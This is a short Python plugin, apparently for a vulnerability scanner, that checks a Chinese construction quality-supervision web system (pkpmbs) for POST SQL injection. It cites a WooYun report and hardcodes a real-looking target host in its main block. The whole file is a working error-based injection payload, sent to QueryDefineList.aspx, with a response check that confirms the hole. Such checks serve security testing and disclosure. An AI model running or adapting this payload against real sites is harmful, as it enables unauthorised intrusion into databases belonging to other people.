#!/usr/bin/python
#-*- encoding:utf-8 -*-
#title:中建质量监督系统POST SQLi
#author: pphaha
#ref: http://www.wooyun.org/bugs/wooyun-2010-0121058


def assign(service, arg):
    if service == "pkpmbs":
        return True, arg


def audit(arg):
    payload = "pkpmbs/CMQuery/CommonManager/QueryDefineList.aspx"
    postdata="__keyword__=%27%20and%20convert%28nvarchar%2C8%2a9%2a7%2a68888%29%2b%27cccc%27%3C1%20and%20%27%25%27%3D%27"

    url = arg + payload
    code, head,res, errcode, _url = curl.curl2(url,postdata)
    if code==500 and '34719552cccc' in res:
        security_hole(url+'----POST SQLi')

if __name__ == '__main__':
    from dummy import *
    audit(assign('pkpmbs', 'http://www.ccjdw.com/')[1])